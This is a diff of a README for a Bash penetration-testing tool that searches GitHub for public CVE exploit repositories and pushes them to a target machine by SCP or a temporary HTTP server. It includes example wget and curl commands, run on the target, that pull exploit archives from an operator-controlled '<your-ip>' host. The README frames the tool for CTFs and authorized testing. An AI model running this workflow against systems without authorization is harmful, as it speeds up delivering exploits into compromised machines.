@@ -1,59 +1,159 @@
-# GitHub_Search_CVE
-### Features
+<div align="center">
 
-- Search CVE exploits from github
-- Download up to 10 CVE exploits at the same time automatically
-- Send the exploits from SCP to a defined target
-- Create HTTP server with the exploits to download it from another machine
+<img src="https://img.shields.io/badge/bash-5.0%2B-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white"/>
+<img src="https://img.shields.io/badge/platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black"/>
+<img src="https://img.shields.io/badge/GitHub_API-v3-181717?style=for-the-badge&logo=github&logoColor=white"/>
+<img src="https://img.shields.io/badge/use_case-CTF%20%2F%20PenTest-red?style=for-the-badge&logo=hackthebox&logoColor=white"/>
 
-# GitHub_Search_CVE
+<br/><br/>
 
-##Requirements
-- Debian based operative system
-- Tested on Kali  2022-01-31 and Ubuntu 20.04
-- <b>git</b>: (Automatic installation from script)
-- <b>curl</b>: (Automatic installation from script)
-- <b>jq</b>: (Automatic installation from script)
-- <b>netcat</b>: (Automatic installation from script)
+```
+  ██████╗██╗   ██╗███████╗    ███████╗███████╗ █████╗ ██████╗  ██████╗██╗  ██╗███████╗██████╗
+ ██╔════╝██║   ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
+ ██║     ██║   ██║█████╗      ███████╗█████╗  ███████║██████╔╝██║     ███████║█████╗  ██████╔╝
+ ██║     ╚██╗ ██╔╝██╔══╝      ╚════██║██╔══╝  ██╔══██║██╔══██╗██║     ██╔══██║██╔══╝  ██╔══██╗
+ ╚██████╗ ╚████╔╝ ███████╗    ███████║███████╗██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║
+  ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+```
 
-##Installation
-You dont need install nothing. It's a shell script =). You only need the sh file and run it!
+### *GitHub CVE Exploit Finder for CTF & Penetration Testing*
 
-## How to use
-`# ./GitHubSearchCVE.sh -e [CVE-XXX-XXXX] -l [Python] -m [SCP] -u [user] -t [10.10.10.25]`
-- <b>-e</b>: Specifies the CVE to search for. The string to be entered must have CVE format **
-- <b>-l</b>: Specifies the language to filter. **
-- <b>-m</b>: Specifies the mode tu run the script **
-- <b>-u</b>: (Only needed if you have selected "SCP" mode) specifies the target username
-- <b>-t</b>: (Only needed if you have selected "SCP" mode) specifies the target ip address
+---
 
-###### CVE Format
-The CVE format must always start with the character sequence CVE followed by a hyphen. The next four digits will be the year in which the CVE was published, we will add another hyphen and finally we will enter the code of the vulnerability, this code can contain between 1 and 7 digits (although we usually find them with between 4 and 5 digits) . 
+🇬🇧 English · 🇪🇸 [Español](./README_ES.md)
 
-<b>Example:</b> CVE-2021-3156 or CVE‑2022‑24525
-###### Valid languages
-You can filter by any language available on GitHub. For exploits, the most typical languages are:
-- Shell
-- Python
-- C
-- Java
-- JavaScript
-- PHP
-- Go
-- Perl
-- Ruby
+</div>
 
-###### Modes that you can run in this script
-This script can work in three modes:
-- <b>Download</b>: In this way, you will be able to search for the exploits and download them in  <b>/tmp/CVEDownloaded/</b>. You can read and try them to your liking.
-- <b>SCP</b>: In this mode, the Download mode will be executed, once it is finished, the downloaded exploits will be sent by SCP to the home folder of the user specified with the <b>-u</b> option on the machine that we have specified with the <b>-t</b> option
-- <b>HTTP</b>: There are times when we do not have full access to a user on the machine on which we want to launch the exploit. For example if the access we have to that machine is by LFI. For this type of case, we can use this mode, which allows us to create an HTTP 0.9 server on ports <b>8080-8089</b> of our computer, in order to be able to download using curl, wget, etc. from the remote machine.
+---
 
-###### How its works?
-The script uses the GitHub URL API to search for the CVE we want filtering by language. For this we use jq, selecting only the clone_url and Language fields. Then, filtering the output and putting it into an array, we git clone each of the repositories, compress them into .tar.gz, calling each file after the developer that contains the repository.
+## 📖 What is this?
 
-In the case of selecting the SCP mode, the script will perform an SCP of all the repositories downloaded to the home of the user that we have defined on the machine that we will also have defined.
+**GitHubSearchCVE** is a Bash script designed for CTF players and penetration testers. Given a CVE identifier, it queries the GitHub API, presents an **interactive list of repositories** sorted by stars, and lets you choose which exploits to download — then delivers them via direct download, SCP transfer to a target machine, or an instant Python HTTP server.
 
-In HTTP mode, the script will netcat ports 8080 (for the first repository) up to 8089 (for the latest repository). Also appearing a message, with the command that you must enter in the machine that we are auditing to download the exploit and use it as we please.
-This mode had a small problem, and that is that when launching netcat, the processes remained waiting, so the script launches them in the background, it also captures the PIDs of these processes so that, once two minutes have passed, these processes are terminated without the user having to interact with them manually.
+---
 
+## ✨ Features
+
+| Feature | Description |
+|---|---|
+| 🔍 **Smart Search** | Queries GitHub API v3 filtered by CVE and language |
+| ⭐ **Sorted by Stars** | Results ordered by community trust |
+| 🖥️ **Interactive Selector** | Choose exactly which repos to download |
+| 📦 **Auto Archive** | Clones and packages repos as `.tar.gz` |
+| 📡 **3 Delivery Modes** | `Download`, `SCP`, or instant `HTTP` server |
+| 🐍 **Python HTTP Server** | Portable file serving — no `nc` quirks |
+| 🔑 **GitHub Token Support** | Avoid rate limiting (10 → 5000 req/min) |
+| 📝 **Session Logging** | Timestamped log saved alongside your downloads |
+| 🛡️ **Input Validation** | CVE format check + API error handling |
+
+---
+
+## ⚙️ Requirements
+
+```bash
+git · curl · jq · python3
+```
+
+On Debian/Ubuntu, install everything at once with `-z on` (requires root):
+
+```bash
+sudo ./GitHubSearchCVE.sh -z on -e CVE-2021-3156 -l Python -m Download
+```
+
+---
+
+## 🚀 Usage
+
+```bash
+./GitHubSearchCVE.sh -e <CVE> -l <Language> -m <Mode> [options]
+```
+
+### Options
+
+| Flag | Description | Required |
+|------|-------------|----------|
+| `-e` | CVE identifier — format: `CVE-YEAR-CODE` | ✅ Yes |
+| `-l` | Language filter: `Python`, `Shell`, `C`, `Go`, `Java`, `PHP`… | ✅ Yes |
+| `-m` | Delivery mode: `Download`, `SCP`, `HTTP` | ✅ Yes |
+| `-n` | Max results to fetch (1–10, default: 10) | ❌ Optional |
+| `-u` | SSH user for SCP mode | SCP only |
+| `-t` | Target IP/host for SCP mode | SCP only |
+| `-z` | Dependency check — use `-z on` to auto-install | ❌ Optional |
+| `-h` | Show help | ❌ Optional |
+
+> 💡 **Tip:** Set a `GITHUB_TOKEN` environment variable to bypass the 10 requests/min API rate limit.
+
+---
+
+## 📋 Examples
+
+### Download mode — save exploits locally
+```bash
+./GitHubSearchCVE.sh -e CVE-2021-3156 -l Python -m Download
+```
+
+### HTTP mode — serve exploits to your target machine
+```bash
+./GitHubSearchCVE.sh -e CVE-2021-4034 -l C -m HTTP -n 5
+```
+Then on the target machine:
+```bash
+wget http://<your-ip>:8080/<exploit>.tar.gz
+# or
+curl -O http://<your-ip>:8080/<exploit>.tar.gz
+```
+
+### SCP mode — push directly to a target
+```bash
+./GitHubSearchCVE.sh -e CVE-2023-0386 -l C -m SCP -u kali -t 10.10.10.25
+```
+
+### With GitHub token (recommended)
+```bash
+export GITHUB_TOKEN="ghp_yourTokenHere"
+./GitHubSearchCVE.sh -e CVE-2022-0847 -l C -m Download
+```
+
+---
+
+## 🔄 Workflow
+
+```
+┌──────────────┐    ┌─────────────────┐    ┌──────────────────────┐
+│  You run the │    │  GitHub API v3  │    │  Interactive list     │
+│  script with │───▶│  returns repos  │───▶│  sorted by ⭐ stars   │
+│  CVE + flags │    │  filtered by    │    │  with metadata        │
+└──────────────┘    │  language       │    └──────────┬───────────┘
+                    └─────────────────┘               │
+                                                       ▼
+                    ┌─────────────────┐    ┌──────────────────────┐
+                    │  Delivered via  │    │  You pick which repos │
+                    │  Download / SCP │◀───│  to clone & archive   │
+                    │  / HTTP server  │    │  as .tar.gz           │
+                    └─────────────────┘    └──────────────────────┘
+```
+
+---
+
+## 📂 Output structure
+
+```
+/tmp/CVEDownloaded/
+├── author1.tar.gz          ← cloned & archived repo
+├── author2.tar.gz
+└── session_20240315_1432.log   ← timestamped session log
+```
+
+---
+
+## ⚠️ Disclaimer
+
+> This tool is intended **exclusively for legal security research**, CTF competitions, and authorized penetration testing. The author is not responsible for any misuse. Always obtain proper authorization before testing systems you do not own.
+
+---
+
+<div align="center">
+
+Made with 🖤 for the CTF & security community
+
+</div>
